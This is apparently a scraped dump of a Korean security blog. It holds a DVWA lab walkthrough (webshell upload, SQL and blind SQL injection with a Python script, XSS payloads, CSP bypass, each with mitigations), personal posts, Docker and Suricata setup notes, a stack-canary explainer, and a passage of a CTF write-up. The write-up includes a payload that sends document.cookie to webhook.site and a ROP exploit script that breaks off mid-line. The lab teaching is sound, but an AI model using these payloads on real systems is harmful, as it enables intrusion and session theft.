업로드 되는 경우 공격자가 “웹쉘”, “악성파일” 등을 업로드하여 서버에 접근할 수 있는 취약점 입니다. &lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123; // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; ?&gt; 코드도 매우 간단합니다. (low 레벨이라. ㅎㅎ) 사용자로 부터 업로드할 파일을 받아서 DVWA ROOT 경로 -&gt; hackable/uploads 폴더에 파일을 업로드하도록 되어 있네요. 이 과정에서 파일에 대한 검증 로직이 없기 때문에 위에서 언급했던 웹쉘 업로드가 가능합니다. &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt; 시스템 함수를 사용하여 웹쉘을 만들어주고, 업로드 하면 됩니다. 저는 shell.php 라는 파일명으로 업로드 하였을 때 (hackable/uploads/shell.php)로 저장이 됩니다. 그럼 이제 해당 경로로 가서 웹쉘을 실행시켜봅시다. File Upload (대응 방안) 업로드 하는 파일의 확장자 검사 또는 화이트 리스트 적용(jpg, png, gif 등) 파일 실행권한(x) 제거 업로드 시에 파일 경로/파일 명을 알 수 없도록 난독화하여 저장 특수문자 필터링 SQL InjectionSQL Injection 취약점은 OWASP 에서도 매번 Top 10 이슈에 뜨는 취약점이라고 할 수 있습니다. 공격자가 취약한 사이트를 대상으로, 악의적인 쿼리를 만들어 요청을 보냄으로써 DB 시스템에 접근, 제어(수정, 삭제, 등록), 조회 등의 행위가 가능하게 됩니다. 예시로 숙박앱을 운영하는 기업중 한 군데가 SQL Injection 공격을 받아 개인정보가 유출당했던 피해도 있었죠 아무튼.. 한번 실습으로 떠나봅시다. &lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123; // Get input $id = $_REQUEST[ &#39;id&#39; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); &#125; ?&gt; 사용자로부터 입력을 받는 폼은 (id) 부분입니다. 값을 입력받아서 $id 변수에 저장하고, users 테이블에 user_id=$id 인 경우를 조회하게 됩니다. 그리고 만약 조회된 데이터가 있을 경우 first_name, last_name을 출력해주는 로직입니다. 어디서 취약점이 발생했을까요? $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; 해당 부분을 보면 사용자로부터 입력값이 넘어온 상태에서 그대로 $id 변수에 저장하고 어떠한 검증도 거치지 않습니다. 그래서 사용자가 어떤 값을 입력하든 모두 쿼리문에 들어간다는 의미로 볼 수 있죠. 만약 해당 쿼리문의 결과를 무조건 참(True)으로 만든다면 결과는 당연히 조회하는 테이블의 모든 행을 출력할 수 있습니다. 아래 쿼리를 입력해봅시다. &#39; or 1=1#&#39; 조회하는 테이블의 모든 행이 조회가 가능했습니다. 이러한 sql injection 공격의 종류에는 아래와 같이 다양합니다. nosql injection time based injection blind injection union injection error based injection … 나중에 예제를 가지고 포스팅 하겠지만, 이외에도 수많은 공격 기법이 존재함을 알 수 있습니다. SQL Injection 대응 방안 특수문자 필터링 PDO(Prepared Statement) 방식의 코드 작성 입력 값 필터링(preg_match) 입력 값 치환(addslashes 등의 함수) 사실 PDO 방식으로만 해도 거의 대부분의 인젝션 공격은 막을 수 있다고 봅니다. SQL Injection(Blind)이번엔, Blind Injection 공격 기법을 알아보겠습니다. Blind 의미는 이전의 SQL Injection 단계처럼 화면 상에 결과를 보여주는 것이 아닌 값이 존재하면 true/false 또는 존재합니다/존재하지 않습니다 등으로 처리하게 됩니다. 그래서 사용자의 데이터를 이전 방법처럼 시도했을 때는 확인이 불가능합니다. 예제 1&#39; or 1=2 order by &lt;num&gt;# num에 위치한 자리에 컬럼의 개수를 1,2,3,4 등으로 넣어서 컬럼의 개수를 확인할 수 있습니다. 만약 대입한 숫자가 컬럼 개수와 일치한다면 “User ID exists in the database.” 문구를 띄울 것입니다. 이런 점을 이용해서 위에서 설명했듯이 값이 맞을 때랑 틀릴 때를 구분하여 값을 하나씩 맞추면서 인젝션을 시도하게 됩니다. #!/usr/bin/python3 import requests from time import sleep url = &quot;http://ip:port/vulnerabilities/sqli_blind&quot; session = &#123;&quot;PHPSESSID&quot;:&quot;key&quot;,&quot;security&quot;:&quot;low&quot;&#125; length = 0 password = &quot;&quot; for i in range(1, 30): param = &#123;&quot;id&quot;:&quot;1&#39; and length(database())=&quot;+str(i)+&quot;#&quot;, &quot;Submit&quot;:&quot;Submit#&quot;&#125; r = requests.get(url, params=param, cookies=session) if(&quot;User ID exists in the database.&quot; in r.text): length = i print(length) break else: print(param) for i in range(1, length+1): for j in range(32, 128): param = &#123;&quot;id&quot;:&quot;1&#39; and substr(database(),&quot; +str(i)+ &quot;, 1)=&quot;&quot;&#39;&quot;+chr(j)+&quot;&#39;&quot;+&#39;#&#39;, &quot;Submit&quot;:&quot;Submit#&quot;&#125; r = requests.get(url, params=param, cookies=session) if(&quot;User ID exists&quot; in r.text): password += chr(j) print(password) else: print(param) 위와 같이 여러 함수들을 사용해서 응용 할 수 있는 것이죠. Blind Injection 에서 사용하는 함수들은 substr, hex, ord, ascii, length, left, right 등 여러 많은 함수가 있습니다. 추후 포스팅 될 여러 DB 엔진에서 발생하는 SQL 인젝션에 대해서 좀 더 알아보도록 합시다. SQL Injection(Blind) 대응 방안 입력 값에 따른 결과를 공격자가 추측할 수 없도록 설정 (true/false) PDO 방식 코딩 권장 대응 방안은 그냥 SQL 인젝션이랑 유사하다고 보시면 됩니다! 다만, true/false 결과가 나오는 정도는 막아주셔야 하겠지요. DOM Based XSS이번에 볼 내용은 XSS(Cross Site Scripting) 공격 기법 중 DOM 방식에 대해서 알아보겠습니다. DOM 방식은 XML이나 HTML 문서에 접근하기 위한 일종의 인터페이스라고 보시면 됩니다. if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123; var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&#39;&quot; + lang + &quot;&#39;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#39;&#39; disabled=&#39;disabled&#39;&gt;----&lt;/option&gt;&quot;); &#125; document.write(&quot;&lt;option value=&#39;English&#39;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#39;French&#39;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#39;Spanish&#39;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#39;German&#39;&gt;German&lt;/option&gt;&quot;); 우선 해당 페이지의 소스 코드를 보면 DOM 객체로 페이지를 처리하고 있음을 알 수 있습니다. URL을 보면 vulnerabilities/xss_d?default=내용 과 같이 처리되는 것이죠. DOM XSS라고 해서 일반적인 XSS와 크게 다르지는 않습니다. default 변수 뒤 값이 들어갈 때의 부분을 조작하여 공격자의 URL이나 스크립트를 실행시킬 수 있게됩니다. alert(document.cookie) DOM Based XSS (대응 방안) 특수문자 필터링 또는 치환 정규식 표현을 통한 입력값 제한 HTML 태그 입력 제한 Reflect XSSReflect XSS 공격 기법은 반사형 XSS라고 부르며, 공격 과정은 다음과 같습니다. 공격자가 악성 스크립트가 포함된 URL을 사용자에게 노출시킵니다. 사용자가 브라우저 내 해당 링크를 클릭했을 때 공격자가 정의한 악성 스크립트가 실행됩니다. 해당 악성 스크립트는 브라우저 내 비밀 정보(세션, 쿠키, 토큰값 등)를 공격자에게 전달하게 됩니다. 이런 과정을 통해서 세션 탈취 등의 행위를 수행할 수 있게됩니다. 페이지를 보면 DOM Based 기법을 볼 때랑 크게 다르지 않습니다. 사용자로부터 입력값을 받아서 브라우저에 출력시켜주고 있는데, name이라는 변수를 사용합니다. 이 때, name 변수에 script 호출을 시켜준다면 실행이 될 것입니다. ?name=location.href='https://www.naver.com&#39;; 해당 코드르 입력값으로 넣어주면 네이버로 페이지가 이동하게 되죠. 이런 점을 이용하여 공격자의 URL로 리다이렉트 시켜서 악성 스크립트를 실행하거나 파일을 내려받는 등의 침투 시나리오까지 생각해볼 수 있습니다. Reflect XSS (대응 방안) HTML 입력값 필터링(php 기준, htmlspecialchars 등의 함수를 사용) Stored XSS XSS 기법중 Stored XSS는 웹 사이트 게시판 등에 스크립트를 작성하는 방식의 공격입니다. 다른 사용자가 본인의 게시글을 읽을 수 있는 곳에 script 태그를 호출하게 만들면, 본인의 게시글을 읽을 때 스크립트가 실행되게 되는 것입니다. 공격 방법은 이전과 동일한 방식으로 갈 수 있기 때문에 생략하겠습니다 ^^. CSP BypassCSP는 Content Security Policy의 약어로 브라우저 콘텐츠 보호 정책입니다. https://developers.google.com/web/fundamentals/security/csp?hl=ko 사이트 내 CSP를 설정하게 되면 허용한 태그 또는 도메인이 아닐 경우 모든 인라인 스크립트 실행을 차단하는 보호 기법이죠. 만약, CSP를 잘못 설정하거나 올바르지 않은 방법으로 사용했을 때는 XSS 공격 같은 유형이 실행되겠죠? &lt;?php $headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics. header($headerCSP); # These might work if you can&#39;t create your own for some reason # https://pastebin.com/raw/R570EE00 # https://hastebin.com/raw/ohulaquzex ?&gt; &lt;?php if (isset ($_POST[&#39;include&#39;])) &#123; $page[ &#39;body&#39; ] .= &quot; &lt;script src=&#39;&quot; . $_POST[&#39;include&#39;] . &quot;&#39;&gt;&lt;/script&gt; &quot;; &#125; $page[ &#39;body&#39; ] .= &#39; &lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt; &lt;/form&gt; &#39;; 코드를 분석해보면 아래 부분에 CSP가 있음을 확인할 수 있습니다. $headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from 우선, script-src의 출처로 pastebin, hastebin, example, code.jquery, ssl-google~~ 등을 허용하고 있습니다. 해당 도메인으로 오는 스크립트 요청은 허용하겠다는 의미이죠. 그런데 pastebin을 허용해뒀네요, pastebin은 클립보드 같은 개념의 공유 서비스인데 여기에 스크립트 태그를 호출시키도록 작성하고 페이지에 로드시키면 스크립트가 실행될 것입니다. https://pastebin.com/raw/WB8N2xSY References https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"Pentesting","slug":"Pentesting","permalink":"https://blog.jhyeon.dev/tags/Pentesting/"},{"name":"DVWA","slug":"DVWA","permalink":"https://blog.jhyeon.dev/tags/DVWA/"}]},{"title":"Mac Big Sur 사용 후기 및 백업의 중요성..","slug":"memo-210118","date":"2021-01-17T15:00:00.000Z","updated":"2021-01-18T03:04:57.268Z","comments":true,"path":"2021/01/18/memo-210118/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/18/memo-210118/","excerpt":"","text":"불과 며칠 전 내 소중한 맥북이 의도치 않은 물리적 파손으로 서비스 센터에 다녀왔다. 큰 고장은 아니였으나 제일 많이 사용하는 키패드 일부가 파손되서 눈물을 흘리면서 수리를 받아야 겠구나 생각했다. 그 때 센터 가는김에 시스템 포맷도 한번 해야 겠다고 문득 생각이 들었다. (왜냐.. Big Sur의 고질적 오류) 맥에서 Big Sur 운영체제가 출시된지 1달?2달 된거같은데 초반기에 “최신버전이 그래도 최고지” 라는 안일한 생각에 업데이트를 했다가 잦은 오류로 인해 엄청난 고생을 했던 경험이 있다. 그런데 왠걸, 애플에서 빅서 잡 오류를 고친 11.0.2 버전을 내놓았다. 여기서 또 나는 혹해서 이번엔 고쳐졌겠지 라는 두번째 안일한 생각과, 주변 사람들이 대부분 고쳐진 것 같은데 라는 의견을 수렴해 또 다시 돌아오지 못할 업데이트 길을 걷고 말았다. 기쁜 마음으로 새 운영체제를 맞이한 순간 초반에 나를 반겨준 오류들은 고쳐진 것 같으나 다양한 오류들이 아직 남아있었다. (페럴 네트워크 오류, 키 입력 문제 등..) 작동해야 할 것들이 안하니깐 슬슬 또 화가 나기 시작했고 이번에는 새로운 버그인가 싶은 간헐적인 버벅임(랙) 현상이 있었다. 이런 여러가지 계기를 통해서 수리를 받으러 가면서 포맷도 맡겨버릴려고 중요 문서나 파일들은 클라우드에 백업을 해둔 뒤, 클라우드 저장소에 폴더만 올라간 것을 확인하고 바로 서비스 센터로 가버렸다. (이 때.. 폴더안에 내용들을 확인했어야 하는데..) 서비스 맡기니깐 키보드 쪽은 가위식 키보드라서 키캡 부분에 약간 문제가 있는거라 금방 수리된다고 전달 받았고 포맷이 1-2일 정도 걸린다고 하셨다. 맡기고 나와서 한 1시간쯤 뒤인가 생각보다 포맷이 빨리되서 찾으러 오셔도 된다고 전화가 왔고.. 근처 일보고 있었다가 점심시간 거쳐서 찾으러 갔다. 그렇게 깔끔하게 포맷된 맥북을 가지고 처음부터 다시 환경 세팅을 하면서 백업 파일도 보는데.. 충격스럽게도 클라우드에 올라간 파일들이 폴더만 올라갔고 안에 내용들이 네트워크 오류로 인해서 하나도 안올라갔던 것이였다. 사태의 심각성을 깨닫고 최신 백업은 아니지만 예전에 다른곳에 백업해둔 파일을 찾아서 하나씩 복구는 했지만 최근에 씩 엎고 새로 만든 “블로그” 파일이 전부 날아가서 멘붕이 왔다. 그래도 블로그에 올라간 포스트들은 github에 public 버전으로 업데이트가 되어있었기에 그나마(?) 다행이라고 생각했다. 결국 블로그 설정 처음부터 다시하면서 업로드한 포스트들 다 git으로 내려받아서 내용 하나하나 수동 복구를 했다 ^^. 약 3시간 정도 걸린 것 같은데 삽질도 이런 삽질이 없던 것 같다. 교훈 백업은 항상 끝까지 잘 확인하자 이중 백업도 필수 (이거 안했으면 진짜로 망했다) 깃허브가 나를 살렸다","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"Big Sur","slug":"Big-Sur","permalink":"https://blog.jhyeon.dev/tags/Big-Sur/"},{"name":"Mac OS","slug":"Mac-OS","permalink":"https://blog.jhyeon.dev/tags/Mac-OS/"},{"name":"Backup","slug":"Backup","permalink":"https://blog.jhyeon.dev/tags/Backup/"}]},{"title":"2021년 IT/보안 분야 전망/동향 자료","slug":"newit-210112","date":"2021-01-11T15:00:00.000Z","updated":"2021-01-17T10:17:21.447Z","comments":true,"path":"2021/01/12/newit-210112/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/12/newit-210112/","excerpt":"","text":"해당 포스트는 노션으로 이전되었습니다. https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"정보보안","slug":"정보보안","permalink":"https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/"},{"name":"최신동향","slug":"최신동향","permalink":"https://blog.jhyeon.dev/tags/%EC%B5%9C%EC%8B%A0%EB%8F%99%ED%96%A5/"}]},{"title":"Ubuntu 20.04 Docker Installation","slug":"docker-install-210108","date":"2021-01-07T15:00:00.000Z","updated":"2021-01-17T10:13:00.137Z","comments":true,"path":"2021/01/08/docker-install-210108/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/08/docker-install-210108/","excerpt":"","text":"Step 1 우분투 패키지 업데이트를 진행합니다. sudo apt update Step 2 도커 필수 라이브러리를 설치합니다. sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common Step 3 GPG KEY 등록 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - Step 4 Repositry 생성 sudo add-apt-repository \\ &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable&quot; Step 5 도커 설치 sudo apt update sudo apt install docker sudo apt install docker-compose","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/tags/Docker/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.jhyeon.dev/tags/Ubuntu/"}]},{"title":"Suricata 설치 & 기초","slug":"suricata-210108","date":"2021-01-07T15:00:00.000Z","updated":"2021-01-17T10:16:16.402Z","comments":true,"path":"2021/01/08/suricata-210108/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/08/suricata-210108/","excerpt":"","text":"Suricata란?IDS(Intrusion Detection System) 시스템으로, 실시간 IDS, IPS, NSM(Network Security Monitoring) 및 pcap 캡처를 지원한다. Suricata Installation아래 설치 가이드는 우분투 20.04 환경에 맞는 설치 방법이다. 18.04는 아마 “sudo apt install suricata”로도 설치가 가능할 것이다. sudo apt update sudo apt install software-properties-common sudo add-apt-repository ppa:oisf/suricata-stable sudo apt update sudo apt install suricata Suricata 기본 룰 셋 다운로드sudo suricata-update sudo systemctl restart suricata 테스트 룰 셋alert tcp any any -&gt; any 80 (msg:&quot;Connection to sites.com&quot;; content:&quot;sites.com&quot;; sid:1001; rev:1;) 위와 같이 테스트 룰 셋을 짜고 저장하면 80포트로 tcp통신하는 sites.com에 대한 패킷을 로그에 찍을 수 있다. 로그 파일은 “/var/log/suricata/fast.log”에서 볼 수 있고 tail 명령어로 실시간으로 찍어볼 수도 있다.","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Network","slug":"Network","permalink":"https://blog.jhyeon.dev/tags/Network/"},{"name":"Suricata","slug":"Suricata","permalink":"https://blog.jhyeon.dev/tags/Suricata/"}]},{"title":"Memory Mitigation - Canary","slug":"mitigation-210102","date":"2021-01-01T15:00:00.000Z","updated":"2021-01-17T10:09:55.728Z","comments":true,"path":"2021/01/02/mitigation-210102/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/02/mitigation-210102/","excerpt":"","text":"Canary 개념메모리 보호 기법(Memory Protection)의 일부에 해당하고, 일반적으로 버퍼 오버플로우(Buffer Overflow) 공격을 수행할 때, SFP(Stack Frame Pointer), RET(Return Address)를 덮어서 공격자가 원하는 흐름을 만들어 줄 수 있는데, 이 때 메모리가 덮어씌워 지는 것을 보호하기 위해서 스택에 할당되는 변수와, SFP(Stack Frame Pointer), RET(Return Address) 사이에서 특정한 값을 추가해서 메모리 변조의 유무를 판단하는 것의 메모리 보호 기법입니다. Canary 종류와 우회 방법Canary 종류에는 3가지로 분류 해볼 수 있습니다. Terminator Canaries Canary 값을 문자열의 끝을 나타내는 문자를 이용해서 생성하는 방식 Random Canaries Canary 값을 랜덤하게 생성 하며, 프로그램 초기 설정 시 전역 변수에 저장 Random XOR Canaries Canary 값을 모든 제어 데이터 또는 일부를 사용하여 XOR-Scramble 하여 생성 Canary Bypassing? Brute-ForceCanary 값은 4byte인데 이 값에서 1byte씩 Brute-Force를 수행하면 Canary 값을 알아낼 수 있습니다. 우선 버퍼의 값을 모두 채운다음에 오는 4byte(canary) 값에 대해서 1byte씩 덮으면서 값을 찾아낼 수 있습니다.0x00 ~ 0xFF(256) 가지의 범위를 가지고 돌려보면 됩니다. Recv, Strncpyrecv와 strncpy 함수는 문자열을 입력 받을 때 NULL 문자가 들어가지 않습니다. 이 점을 이용해서 버퍼가 printf 된다면 버퍼를 채워서 canary값을 출력하게 할 수 있습니다. Canary Routine LeakCanary를 생성하는 루틴이 노출될 경우 역 연산을 통해서 Canary 값을 알아낼 수 있습니다. References https://www.notion.so/jhyeon/Memory-Mitigation-Canary-c00cbfe3a8594b3398138fcf2adb7796 https://koharinn.tistory.com/49 https://xerxes-break.tistory.com/285","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.jhyeon.dev/tags/Linux/"},{"name":"Memory Mitigation","slug":"Memory-Mitigation","permalink":"https://blog.jhyeon.dev/tags/Memory-Mitigation/"},{"name":"Canary","slug":"Canary","permalink":"https://blog.jhyeon.dev/tags/Canary/"}]},{"title":"2020년 정리 & 2021년 계획","slug":"newyear-210102","date":"2021-01-01T15:00:00.000Z","updated":"2021-01-17T10:07:56.114Z","comments":true,"path":"2021/01/02/newyear-210102/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/02/newyear-210102/","excerpt":"","text":"2020 한 해를 돌아보며2020.01 [전공 동아리 회장]2020년을 시작하면서 학교에 입학할 시기부터 활동 해왔던 “해킹 &amp; 보안 동아리인, B@ngsiri 회장을 맡게 되었다. 회장 후보로 나갈 때 다짐했던 것이 기존의 스터디, 세미나, 교육 같은 부분에 있어서 개선을 하고 동아리에 도움이 되는 것들이 있다면 많이 끌어와서 동아리원들에게 많은 도움이 되었으면 하는게 회장 공약이였고, 내 다짐이기도 했다. 그렇게 회장에 당선되고 첫 시작으로 KUCIS(대학정보보호동아리연합회) 신청을 시작으로 여러 교육작인 부분이나 세미나들을 알아 보면서 동아리원들에게 공지하고 하면서 한달 두달 보내왔던 것 같다. 이제 3월이 되고부터는 본격적으로 동아리 홍보에 나서면서 학과에 들어오는 신입생들에 대한 모집을 시작했다. 이번년 초에 코로나19가 확산되면서 사실 오프라인 자리에서는 신입생들을 직접 보면서 홍보를 할 수 없었고 같이 만나서 회식을 하거나 이런 자리도 사실 불가능 했다. 그래서 결국 모집에 있어서는 100% 비대면으로 진행을 했고, 이런 문제를 처음 겪다보니 온라인으로 행사를 준비하는 것이 되게 많이 힘들었던 것 같다. 기존에는 오프라인 모임을 가져서 동아리 홍보도 하고, 후배들이 선배들에게 궁금한 것도 묻고 서로 친해지는 자리가 있었는데 올해는 그런게 없었다.. 그렇지만 어떻게 진행은 했기에 신입생도 모집하고 했지만 그 다음이 항상 문제였다.. 오프라인으로 진행될 행사들이 다 온라인으로 전환되거나 취소되면서, 단도직입적으로 말하면 기존 동아리원들이나 신입생들에게 챙겨줄 수 있는게 많이 없었다. 그래서 지난 부분들 돌아보면 이런게 가장 미안하면서도 좀 아쉬웠던 부분으로 남았다. 결코 회장이라는 자리가 확실히 부담감이 있고 무겁게 느껴졌지만 옆에서 같이 도와주는 운영진들이 있었기에 버틸 수 있지 않았나 싶었다.. 2020.06 [BOB 9기 합격]금년 5월부터 준비하던 BOB(이하, best of the best 9th) 교육생으로 최종 합격을 하였다. 서류 접수부터 필기 시험 면접 준비까지 작년처럼 생생한 기억이 들었고 올해는 꼭 붙겠다는 마인드 하나로 되게 열심히 준비했었던 것 같다. (일반 생활 시간 빼면 거의 BOB 준비에 투자할 만큼 열정을 쏟아 부었지..) 최종 합격 이후 7월부터 이제 본격적인 교육생 신분으로 최고 정보보안전문가인 멘토님들에게 지도를 받고 9월에는 사람들끼리 팀을 모아 하나의 프로젝트를 하는 기간이였다. 7-8월 교육때 거의 밥먹는 것도 포기하면서 하루 10-15시간 교육을 들어서 그런지 하루가 어떻게 지나갔는지도 모르겠다. (이 때 진짜 죽을뻔..) 그렇게 두달이 순식간에 지나가고 9월이 되면서 프로젝트 준비에 한창이였는데 이 때가 가장 고민이 많았다. 왜냐하면 주제를 선정하는데도 어려움이 있었고, 우리팀을 맡아서 지도 해주실 멘토님들도 섭외를 해야했기에.. 그래도 멋진 멘토님들을 구해서 함께 할 수 있어서 정말 좋았다. 같은 팀원으로써도 열심히 해준 팀원들에게도 감사하다는 인사 올립니다! 어쩌다보니 벌써 새해 1월이고 이제 수료까지 3개월밖에 남지 않았다는 것에 아쉬움이 많이 남고있지만 남은 기간 화이팅 해볼 예정입니다! 2020.09 [해킹/보안 연구 데몬팀 합격]개인적으로 들어가고 싶었던 해킹팀에 올해 지원을 해서 합격을 하였다. 준비하는 기간동안 역량을 테스트하는 과제가 주어졌었고 그 과제를 하나하나 해나가면서 열심히 준비했다. (지원 기간동안 BOB랑 많이 겹쳐서 못한 과제도 많아서 불안했던 건 사실…) 결과로 데몬팀에 최종 합격할 수 있었다는 메일을 받아볼 수 있었고, 뿌듯함과 동시에 열심히 해야겠다는 생각도 많이 들었다. 앞으로의 계획 취업 자격증 취득 &amp;&amp; 개인 공부 건강(헬스 등..) 큰 분류로 3개 나눠봤다우선 순위이자 계획이고 하나하나 열심히 준비해서 2021년에는 좀 더 성실한 사람이 되야겠다.","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"회고","slug":"회고","permalink":"https://blog.jhyeon.dev/tags/%ED%9A%8C%EA%B3%A0/"}]},{"title":"시스템 OS 개념 및 기초","slug":"systemos-210101","date":"2020-12-31T15:00:00.000Z","updated":"2021-01-17T10:04:44.989Z","comments":true,"path":"2021/01/01/systemos-210101/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/01/systemos-210101/","excerpt":"","text":"해당 포스트는 노션으로 이전되었습니다. https://www.notion.so/jhyeon/OS-Basic-8ab6955b2060478fa2a7846d128f7490","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"System","slug":"System","permalink":"https://blog.jhyeon.dev/tags/System/"},{"name":"OS","slug":"OS","permalink":"https://blog.jhyeon.dev/tags/OS/"},{"name":"syscall","slug":"syscall","permalink":"https://blog.jhyeon.dev/tags/syscall/"}]},{"title":"웹 해킹 기법 기초","slug":"webhacking-210101","date":"2020-12-31T15:00:00.000Z","updated":"2021-01-17T10:06:18.769Z","comments":true,"path":"2021/01/01/webhacking-210101/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/01/webhacking-210101/","excerpt":"","text":"해당 포스트는 노션으로 이전되었습니다. https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"Web Hacking","slug":"Web-Hacking","permalink":"https://blog.jhyeon.dev/tags/Web-Hacking/"}]},{"title":"ChristmasCTF 2019 Write up","slug":"christmasctf-201226","date":"2020-12-25T15:00:00.000Z","updated":"2021-01-17T10:01:42.549Z","comments":true,"path":"2020/12/26/christmasctf-201226/","link":"","permalink":"https://blog.jhyeon.dev/2020/12/26/christmasctf-201226/","excerpt":"","text":"1. [Web] watermelon이 문제는 언인텐 풀이로 푼 것 같다. 문제 내에서 로그인 계정 중 admin 계정에 대해서 비밀번호가 admin 과 같이 세팅되어 있음을 알 수 있었고, 이를 통해 로그인 하여 플래그를 얻어낼 수 있었다. 2. [Web] JWTjwt: &#123; bruth: &#123; key: &#39;********&#39;, // 0~9, 8 length options: &#123; issuer: &#39;c2w2m2&#39;, expiresIn: &#39;1d&#39;, algorithm: &#39;HS256&#39;, &#125; &#125;; 해당 문제는 PHP JWT TOKEN 를 사용하는 문제이다. config.js 에서 위와 같은 내용을 확인할 수 있었고 결론적으로 secret key를 브포해서 찾아내야 하는 것이였다. 그래서 해당 범위 내 숫자로 구성해서 브포를 돌려서 토큰의 secret key를 얻었고, payload 부분에 있는 is_admin 항목을 true로 변조한 뒤 다시 인코딩하여 쿠키를 바꿔줌으로써 플래그를 얻었다. 참고 : john the ripeer(https://www.openwall.com/john/) 3. [Web] CSRF해당 문제는 CSRF(Cross-site-Request-Forgery) 취약점을 사용한 문제이다. 문제에 보면 게시글을 쓸 수 있는 공간이 있고, 해당 로직을 처리하는 부분의 코드를 분석했을 때 다음과 같은 사실을 알 수 있다. if (board.content.match(/script|img|on/i)) return res.send(&#123; code: 400 &#125;); 무려 내용 작성에 대해서만 필터링을 걸고 제목에는 없다.. 그래서 이를 이용해서 제목에 페이로드를 넣었다. location.href=&#39;https://webhook.site~&#39; + document.cookie; 4. [Pwn] Solo testROP 기법을 이용해서 풀면 된다. #!/usr/bin/python from pwn import * p = process(&#39;./solo_test&#39;) e = ELF(&#39;./solo_test&#39;) libc = ELF(&#39;./libc227.so&#39;) pr = 0x0000000000400b83 ret = 0x00000000004005f1 puts_plt = e.plt[&#39;puts&#39;] puts_got = e.got[&#39;puts&#39;] solo = e.symbols[&#39;solo&#39;] puts_offset = libc.symbols[&#39;puts&#39;] system_offset = 